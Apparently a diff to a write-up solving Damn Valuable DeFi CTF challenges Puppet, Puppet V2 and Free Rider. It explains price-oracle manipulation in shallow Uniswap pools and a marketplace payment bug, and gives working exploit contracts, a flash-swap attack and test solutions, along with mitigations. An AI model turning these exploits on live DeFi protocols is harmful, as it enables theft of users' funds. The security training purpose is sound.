@@ -525,3 +525,225 @@ Success! With sources private keys we managed to lower the NFT price to zero, bu
 ### Mitigation
 
 Exposing private keys on the web is never a good idea
+
+## Challenge #8 - Puppet
+There’s a lending pool where users can borrow Damn Valuable Tokens (DVTs). To do so, they first need to deposit twice the borrow amount in ETH as collateral. The pool currently has 100000 DVTs in liquidity.
+
+There’s a DVT market opened in an old Uniswap v1 exchange, currently with 10 ETH and 10 DVT in liquidity.
+
+Pass the challenge by taking all tokens from the lending pool. You start with 25 ETH and 1000 DVTs in balance.
+
+## `PuppetPool.sol`: dangerous pool balances accounting
+
+To borrow DVT tokens user must pay a collateral in ETH tokens which is an equivalent of the loan multiplied by 2. ETH/DVT price is sourced with the `computeOraclePrice` function which returns ratio of ETH amd DVT balances owned by the uniswap pair
+
+`return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);`
+
+Current ratio is 10:10, with liquidity this small it's pretty easy to manipulate the price.
+
+## Proof of concept
+
+Attacker contract. Here we are draining the pair with one swap of 1000 DVT tokens, which leaves pool with ratio ~ 0.09/1010, after this we can borrow 100000 DVT from the pool with a collateral equal to ~19 ETH
+
+```
+    function attack(uint256 tokenAmountIn, uint256 tokenAmountOut) external payable {
+        DVT.transferFrom(msg.sender, address(this), tokenAmountIn);
+        DVT.approve(address(uniPool), tokenAmountIn);
+
+        uint256 ethAmountOut = uniPool.tokenToEthSwapInput(tokenAmountIn, 1, block.timestamp * 2);
+        pool.borrow{value: msg.value + ethAmountOut}(tokenAmountOut, msg.sender);
+    }
+
+    receive() external payable {}
+```
+
+Attack in tests `puppet.challenge.js `
+
+```
+    it('Execution', async function () {
+        /** CODE YOUR SOLUTION HERE */
+        const Exploit = await ethers.getContractFactory('PuppetExploit');
+        exploit = await Exploit.deploy(lendingPool.address, uniswapExchange.address, token.address);
+
+        await token.connect(player).approve(exploit.address, PLAYER_INITIAL_TOKEN_BALANCE);
+        await exploit.connect(player).attack(
+            PLAYER_INITIAL_TOKEN_BALANCE,
+            POOL_INITIAL_TOKEN_BALANCE,
+            {value: 99n * 10n ** 17n}
+        );
+    });
+```
+
+## Mitigation
+
+Liquidity pool should have more tokens, so it will be harder to manipulate the spot price. Use Uniswap libs to calculate price as an output amount of a virtual swap.
+
+## Challenge #9 - Puppet V2
+The developers of the previous pool seem to have learned the lesson. And released a new version!
+
+Now they’re using a Uniswap v2 exchange as a price oracle, along with the recommended utility libraries. That should be enough.
+
+You start with 20 ETH and 10000 DVT tokens in balance. The pool has a million DVT tokens in balance. You know what to do.
+
+## `PuppetV2Pool.sol`: small uniswap liquidity pool allows to manipulate the price
+
+Again like in the previous, the pool is small enough to greatly move the price with a single swap.
+
+## Proof of concept
+
+Swapping 10000 DVT is enough to reduce the price. Now we need only ~30 ETH to borrow 100000 DVT.
+```
+    it('Execution', async function () {
+        /** CODE YOUR SOLUTION HERE */
+        await token.connect(player).approve(uniswapRouter.address, PLAYER_INITIAL_TOKEN_BALANCE);
+        await uniswapRouter.connect(player).swapExactTokensForETH(
+            PLAYER_INITIAL_TOKEN_BALANCE,
+            0,
+            [token.address, weth.address],
+            player.address,
+            (await ethers.provider.getBlock('latest')).timestamp * 2
+            
+        );
+        let wethAmount = await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        await weth.connect(player).deposit({value: wethAmount});
+        await weth.connect(player).approve(lendingPool.address, wethAmount);
+        await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE);
+    });
+```
+## Mitigation
+
+Use time weighted oracle. Create deeper liquidity pools.
+
+## Challenge #10 - Free Rider
+A new marketplace of Damn Valuable NFTs has been released! There’s been an initial mint of 6 NFTs, which are available for sale in the marketplace. Each one at 15 ETH.
+
+The developers behind it have been notified the marketplace is vulnerable. All tokens can be taken. Yet they have absolutely no idea how to do it. So they’re offering a bounty of 45 ETH for whoever is willing to take the NFTs out and send them their way.
+
+You’ve agreed to help. Although, you only have 0.1 ETH in balance. The devs just won’t reply to your messages asking for more.
+
+If only you could get free ETH, at least for an instant.
+
+## `FreeRiderNFTMarketplace.sol`: when buying multiple tokens market compares msg.value to a price of a single token instead of a whole batch
+
+Users are allowed to buy tokens in batches with the payable function `buyMany`, inside this there is a loop which iterates through all `tokenId`s in the batch and calls `_buyOne` function, where msg.value is compared with a `tokenId` price, thus one is able to pass msg.value amount equal to a price of a single token.
+
+## `FreeRiderNFTMarketplace.sol`: wrong token owner inside `buyOne` function, price is being sent not to the initial seller, but to the new owner
+
+`ownerOf(tokenId)` is changed during  the `safeTransferFrom`. As a result market sends ETH to a buyer instead of a seller.
+
+```
+        // transfer from seller to buyer
+        DamnValuableNFT _token = token; // cache for gas savings
+        _token.safeTransferFrom(_token.ownerOf(tokenId), msg.sender, tokenId);
+
+        // pay seller using cached token
+        payable(_token.ownerOf(tokenId)).sendValue(priceToPay);
+```
+
+## Proof of concept
+
+Contract which allows us to get money from the Uniswap with their flash swap feature, buy all tokens from the market and send them to the bounty contract
+
+```
+contract RiderExploit {
+    FreeRiderNFTMarketplace public immutable market;
+    ERC721 public immutable nft;
+    IUniswapV2Pair public immutable pair;
+    address public reward;
+
+    uint256[] private ids = [0, 1, 2, 3, 4, 5];
+
+    constructor (FreeRiderNFTMarketplace _market, ERC721 _nft, IUniswapV2Pair _pair, address _reward) {
+        market = _market;
+        nft = _nft;
+        pair = _pair;
+        reward = _reward;
+    }
+
+    function attack(uint256 wethAmount) external {
+        pair.swap(wethAmount, 0, address(this), "0x");
+        uint256 bal = address(this).balance;
+        msg.sender.call{value: bal}("");
+    }
+
+    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
+        IWETH weth = IWETH(pair.token0());
+        // buy nft
+        weth.withdraw(amount0);        
+        market.buyMany{value: amount0}(ids);
+        // transfer nft to rewarder
+        for(uint256 i=0; i<ids.length; i++) {
+            nft.safeTransferFrom(address(this), reward, ids[i], abi.encode(address(this)));
+        }
+        // return tokens to uniswap
+        // about 0.3% fee, +1 to round up
+        uint256 fee = (amount0 * 3) / 997 + 1;
+        uint256 amountToRepay = amount0 + fee;
+        weth.deposit{value: amountToRepay}();
+        weth.transfer(address(pair), amountToRepay);
+    }
+
+    function onERC721Received(
+        address operator,
+        address from,
+        uint256 tokenId,
+        bytes calldata data
+    ) external pure returns (bytes4) {
+        return this.onERC721Received.selector;
+    }
+
+    receive() external payable {}
+}
+```
+
+Attack implementation in tests
+
+```
+    it('Execution', async function () {
+        /** CODE YOUR SOLUTION HERE */
+        const Exploit = await ethers.getContractFactory('RiderExploit');
+        exploit = await Exploit.deploy(marketplace.address, nft.address, uniswapPair.address, devsContract.address);
+        await weth.connect(player).deposit({value: 5n * 10n ** 16n});
+        await weth.connect(player).transfer(exploit.address, 5n * 10n ** 16n);
+        await exploit.connect(player).attack(NFT_PRICE);
+    });
+```
+
+## Mitigation
+
+Accumulate `totalPrice` and compare it to `msg.value`. Pay the token price to the old owner (seller).
+
+```
+function buyMany(uint256[] calldata tokenIds) external payable nonReentrant {
+        uint256 totalPrice;
+        for (uint256 i = 0; i < tokenIds.length;) {
+            unchecked {
+                totalPrice += _buyOne(tokenIds[i]);
+                ++i;
+            }
+        }
+        
+        if (msg.value < totalPrice)
+            revert InsufficientPayment();
+
+    }
+
+    function _buyOne(uint256 tokenId) private returns(uint256){
+        uint256 priceToPay = offers[tokenId];
+        if (priceToPay == 0)
+            revert TokenNotOffered(tokenId);
+            
+        --offersCount;
+
+        // transfer from seller to buyer
+        DamnValuableNFT _token = token; // cache for gas savings
+        address seller = _token.ownerOf(tokenId);
+        _token.safeTransferFrom(_token.ownerOf(tokenId), msg.sender, tokenId);
+
+        // pay seller using cached token
+        payable(seller).sendValue(priceToPay);
+
+        emit NFTBought(msg.sender, tokenId, priceToPay);
+        return priceToPay;
+    }
+```
